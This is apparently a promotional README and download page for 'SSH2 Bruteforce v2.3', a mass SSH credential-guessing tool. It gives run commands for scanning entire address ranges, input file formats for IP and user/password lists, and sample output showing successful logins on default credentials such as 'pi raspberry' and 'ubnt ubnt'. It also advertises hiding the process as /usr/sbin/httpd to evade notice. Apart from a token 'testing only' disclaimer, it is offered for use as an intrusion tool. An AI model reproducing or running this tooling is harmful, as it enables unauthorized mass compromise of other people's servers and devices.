
# @SSH2 Bruteforce v2.3 @ 2015!

BSSHv2.3 is a great tool for scanning ssh2 connections by providing a list of IPs and passwords. It is fast, reliable and easy to use. It is written in C++, therefore it is compatible on a large scale of unix systems, both 32 and 64 bits.

Compatible on 32 and 64 bit sistem on a various systems
Fast and reliable
Easy to use
Using fork() hidden process (will appear as /usr/sbin/httpd instead of bssh2 in `ps aux` command)
Making differance between linux sistems and NON-BASH systems
The script will run and eventually catch two type of ssh2 connections :

NOBASH (nobash.txt) -> systems that can’t support basic and common SSH2 commands, but can still be used as a sshtunnel (some of them)
LINUX (vuln.txt) -> systems that can support basic and common SSH2 commands
 

Before the scan start you must provide 2 files :
scan.log (ips line by line)

* 1.2.3.4
* 4.4.4.4
* 5.5.5.5


pass.txt

* user1 pass1
* user2 pass2
* anotheruser anotherpass

ATTENTION:
Scan from uid0 servers:


* ./scan_root 62
* scanning network 62.*.*.*
* usec: 100, burst packets 50
* using "(tcp[tcpflags]=0x12) and (src port 22) and (dst port 46222)" as pcap filter
* my detected ip on eth0 is 1*7.**.2**.3
* capturing process started pid 27055
* scanning 62.0.0.*
* scanning 62.0.1.*
* .......
* @SSH2 Bruteforce v2.3 @ 2015!
* -> by lan.tester@yahoo.com
* -> E-mail us for support or if you want to make a donation !
* Login successful!
* Vipcode is OK
* nobash -> aaron aaron 62.*.*.* 22
* nobash -> account account 62.*.*.* 22
* nobash -> account account 62.*.*.* 22

Scan from normal user (not uid0):
1. SCAN A CLASS

*  ./mass 88
* [*] MASS scan for USERs
* scanning: 88.0.255.* (total: 1575) (100.0% done)
* pscan completed in 299 seconds. (found 1577 ips)
* @SSH2 Bruteforce v2.3 @ 2015!
* -> by lan.tester@yahoo.com
* -> E-mail us for support or if you want to make a donation !
* Login successful!
* Vipcode is OK
* nobash -> pi raspberry 88.0.*.* 22

SCAN B CLASS # the small one

*  ./scan_user A_CLASS.B_CLASS

EXAMPLE:

* ./scan_user 81.2
* scanning: 81.2.255.* (total: 520) (100.0% done)
* pscan completed in 285 seconds. (found 3520 ips)
* @SSH2 Bruteforce v2.3 @ 2015!
* -> by lan.tester@yahoo.com
* -> E-mail us for support or if you want to make a donation !
* Login successful!
* Vipcode is OK
* nobash -> ubnt ubnt 81.2.*.* 22

Download SSH2 Bruteforce v2.3 @ 2015

This software is intended for testing only. Please use it at your own risk!
